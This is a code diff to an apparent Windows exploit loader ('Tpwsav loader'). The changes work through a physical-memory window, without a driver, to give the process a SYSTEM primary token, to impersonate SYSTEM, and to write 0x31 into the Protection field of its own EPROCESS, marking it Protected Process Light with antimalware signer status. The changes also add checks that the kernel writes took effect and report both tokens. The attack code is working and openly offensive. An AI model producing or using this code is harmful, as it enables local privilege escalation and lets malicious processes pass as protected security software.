@@ -163,6 +163,19 @@ static void ReportCrash() {
     SafeRestore();
 }
 
+static bool IsSystemToken(HANDLE hToken) {
+    if (!hToken) return false;
+    BYTE buf[256] = {};
+    DWORD needed = 0;
+    if (!GetTokenInformation(hToken, TokenUser, buf, sizeof(buf), &needed))
+        return false;
+    BYTE sid[SECURITY_MAX_SID_SIZE] = {};
+    DWORD sz = sizeof(sid);
+    if (!CreateWellKnownSid(WinLocalSystemSid, NULL, sid, &sz))
+        return false;
+    return EqualSid(((TOKEN_USER*)buf)->User.Sid, sid);
+}
+
 static int RunBody();
 
 static int Run() {
@@ -466,34 +479,38 @@ static int RunBody() {
     RestorePhysWindow();
 
     g_Phase = PH_PPL;
+    // Primary token first: this is what makes the *process* SYSTEM. The thread
+    // impersonation below is a fallback for when the swap is refused.
+    SetProcessSystemToken(systemCr3, &kOffsets);
     if (!ImpersonateSystem())
-        printf("[-] Failed to impersonate SYSTEM\n");
+        printf("[-] Failed to impersonate SYSTEM on this thread\n");
 
     // PPL via physical memory window — no driver needed
     {
-        DWORD ourPid = GetCurrentProcessId();
-        ULONG64 psActiveVA = kOffsets.NtoskrnlBase + kOffsets.PsActiveProcessHead;
-        ULONG64 psActivePA = WindowVirtToPhys(systemCr3, psActiveVA);
-        if (psActivePA) {
-            ULONG64 link = WindowRead64(psActivePA);
-            int n = 0;
-            while (link != psActiveVA && link && n++ < 500) {
-                ULONG64 eprocessVA = link - kOffsets.ActiveProcessLinks;
-                ULONG64 eprocessPA = WindowVirtToPhys(systemCr3, eprocessVA);
-                if (!eprocessPA) break;
-                if ((DWORD)WindowRead64(eprocessPA + kOffsets.UniqueProcessId) == ourPid) {
-                    ULONG64 protPA = WindowVirtToPhys(systemCr3, eprocessVA + kOffsets.Protection);
-                    if (protPA) {
-                        BYTE ppl = 0x31; // PsProtectedTypeLight | PsProtectedSignerAntimalware
-                        WindowWriteBuffer(protPA, &ppl, 1);
-                        printf("[+] PPL set (0x31)\n");
-                    }
-                    break;
+        ULONG64 ourEprocessVA = 0;
+        if (WindowFindOurEprocess(systemCr3, &kOffsets, &ourEprocessVA)) {
+            printf("[*] Our EPROCESS: 0x%llX (Protection off 0x%X)\n",
+                   ourEprocessVA, kOffsets.Protection);
+            ULONG64 protPA = WindowVirtToPhys(systemCr3, ourEprocessVA + kOffsets.Protection);
+            if (protPA) {
+                BYTE before = WindowRead8(protPA);
+                BYTE ppl = 0x31; // PsProtectedTypeLight | PsProtectedSignerAntimalware
+                WindowWriteBuffer(protPA, &ppl, 1);
+                // Read back immediately: a readback of 0x31 means the write
+                // landed and something reverted it later (kernel data
+                // protection), while 0x00 means the store never took effect.
+                BYTE after = WindowRead8(protPA);
+                if (after == ppl) {
+                    printf("[+] PPL set (0x%02X, was 0x%02X)\n", after, before);
+                } else {
+                    printf("[-] PPL write did not stick (0x%02X -> wanted 0x%02X) "
+                           "- the field is write protected\n", before, ppl);
                 }
-                ULONG64 nextPA = WindowVirtToPhys(systemCr3, link);
-                if (!nextPA) break;
-                link = WindowRead64(nextPA);
+            } else {
+                printf("[-] PPL: Protection (off 0x%X) did not translate\n", kOffsets.Protection);
             }
+        } else {
+            printf("[-] PPL: could not locate our EPROCESS\n");
         }
     }
 
@@ -523,20 +540,20 @@ static int RunBody() {
     }
 
     {
-        HANDLE hToken = NULL;
-        bool isSys = false;
-        if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken)) {
-            BYTE buf[256] = {};
-            DWORD needed = 0;
-            if (GetTokenInformation(hToken, TokenUser, buf, sizeof(buf), &needed)) {
-                BYTE sid[SECURITY_MAX_SID_SIZE] = {};
-                DWORD sz = sizeof(sid);
-                if (CreateWellKnownSid(WinLocalSystemSid, NULL, sid, &sz))
-                    isSys = EqualSid(((TOKEN_USER*)buf)->User.Sid, sid);
-            }
-            CloseHandle(hToken);
-        }
-        printf("[%c] SYSTEM: %s\n", isSys ? '+' : '-', isSys ? "YES" : "NO");
+        // Report the two tokens separately. The thread token is what API calls
+        // in this thread are checked against; the primary token is what the
+        // process actually is. Reporting only the thread token makes a process
+        // that is still running as admin look like SYSTEM.
+        HANDLE procTok = NULL, threadTok = NULL;
+        OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &procTok);
+        OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &threadTok);
+
+        bool sys = IsSystemToken(procTok);
+        bool thr = IsSystemToken(threadTok);
+        printf("[%c] Process token: %s\n", sys ? '+' : '-', sys ? "SYSTEM" : "NOT SYSTEM");
+        printf("[%c] Thread token:  %s\n", thr ? '+' : '-', thr ? "SYSTEM" : "NOT SYSTEM");
+        if (procTok) CloseHandle(procTok);
+        if (threadTok) CloseHandle(threadTok);
     }
 
     printf("\n[+] Tpwsav loader complete\n");
